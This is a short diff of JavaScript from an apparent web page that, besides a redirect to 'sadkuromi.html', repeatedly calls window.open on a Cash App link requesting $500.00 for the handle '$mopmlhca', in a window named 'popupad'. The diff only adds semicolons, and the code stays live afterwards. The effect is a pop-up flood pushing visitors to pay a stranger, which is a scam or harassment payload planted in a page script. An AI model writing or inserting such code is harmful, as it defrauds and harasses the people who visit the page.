@@ -4,11 +4,11 @@
 }
 else window.location.assign("sadkuromi.html");
 
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
-window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto')
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
+window.open('https://cash.app/$mopmlhca/500.00','popupad','width=auto,height=auto');
